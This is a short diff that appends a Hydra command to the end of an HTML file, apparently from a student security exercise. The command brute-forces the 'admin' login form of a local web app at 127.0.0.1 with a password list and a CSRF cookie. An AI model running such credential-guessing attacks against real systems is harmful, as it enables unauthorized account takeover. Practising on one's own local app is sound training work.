@@ -19,3 +19,6 @@
 
 </body>
 </html>
+
+
+hydra -f -l admin -P /home/apprenant/Documents/01projet_python/DevIA_Roubaix/cybersecure/password.txt 127.0.0.1 http-get-form "/login/:username=^USER^&Password=^PASS^:F=mdp ou username incorrect:H=Cookie:csrftoken=tHFqFrQj9KBlQJ54LRlrXgJUa1EnreEY" -V
